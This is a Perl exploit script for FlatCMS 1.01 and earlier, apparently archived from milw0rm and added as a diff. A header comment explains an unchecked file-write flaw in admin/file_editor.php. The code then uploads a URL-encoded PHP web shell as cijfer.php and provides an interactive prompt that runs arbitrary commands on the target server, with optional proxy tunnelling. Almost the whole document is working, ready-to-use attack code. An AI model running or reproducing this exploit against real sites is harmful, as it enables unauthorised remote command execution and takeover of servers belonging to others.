@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+#
+# FlatCMS <=1.01 Remote Command Execution Exploit
+#
+# Copyright (c) 2005 cijfer <cijfer@netti.fi>
+# All rights reserved.
+#
+# An input validation flaw exists within 'admin/file_editor.php'
+# of FlatCMS which can lead to remote command execution. 
+# Here is where the problem is (line 22 of 97):
+#
+#	...
+# [1]	if($save_file != "") {
+# [2]       	$f_content = stripslashes("$f_content");
+#        	if(!$f_w = fopen($save_file, w)) {
+#              		echo ("Cannot open file ("."$save_file".")<br />\n");
+#        	}
+# [3]       	if(!fwrite($f_w,$f_content)) {
+#                	echo ("File "."$save_file"." is not writable!<br />\n");
+#        	}
+#        	echo("Done saving file "."$save_file"."<br />\n");
+#	}
+#	...
+#
+# 1. If $save_file is not empty, use it.
+# 2. $f_content filters only slashes? that is all?
+# 3. write contents of $f_content into $save_file! :))
+#
+# kiitos ReZEN (www.xorcrew.net) :))
+#
+# $Id: cijfer-fcmsxpl.pl,v 0.1 2005/01/04 03:48:00 cijfer Exp cijfer $
+
+use LWP::UserAgent;
+use URI::Escape;
+use Getopt::Long;
+use Term::ANSIColor;
+
+$port = 80;
+$res  = GetOptions("host=s" => \$host, "dir=s" => \$dir, "port=i" => \$port, "tunnel=s" => \$tunnel);
+
+&usage unless $host and $dir;
+
+while()
+{
+	print color("green"), "cijfer\$ ", color("reset"); # colors :))!
+	chomp($command = <STDIN>);
+	exit unless $command;
+	&exploit($command);
+}
+
+sub usage
+{
+	print "FlatCMS <=1.01 Remote Command Execution Exploit\n";
+	print "Usage: $0 -hd [OPTION]...\n\n";
+	print "  -h --host\thostname or ip of target\n";
+	print "  -d --dir\tdirectory without ending slash\n";
+	print "  -p --port\tport number (default: 80)\n";
+	print "  -t --tunnel\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n\n";
+	exit;
+}
+
+sub exploit
+{
+	$cij=LWP::UserAgent->new() or die;
+	$cij->agent("Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)");
+	$cij->proxy("http", "http://".$tunnel."/") unless !$tunnel;
+
+	$string  = "echo%20_cijfer_%3B";
+	$string .= uri_escape(shift);
+	$string .= "%3Becho%20_cijfer_";
+
+	$execut  = "%3C%3F%24handle%3Dpopen%5C%28%24_GET%5Bcij%5D%2C%22r%22%29%3Bwhile%28%21feof";
+	$execut .= "%28%24handle%29%29%7B%24line%3Dfgets%28%24handle%29%3Bif%28strlen%28%24line%";
+	$execut .= "29%3E%3D1%29%7Becho%22%24line%22%3B%7D%7Dpclose%28%24handle%29%3B%3F%3E";
+
+	$path = "http://".$host.$dir."/admin/file_editor.php";
+	$out=$cij->get($path."?save_file=cijfer.php&f_content=".$execut);
+	$out=$cij->get("http://".$host.$dir."/admin/cijfer.php?cij=".$string);
+
+	if($out->is_success)
+	{
+		@cij=split("_cijfer_",$out->content);
+		print substr(@cij[1],1);
+	}
+}
+
+# milw0rm.com [2006-01-04]
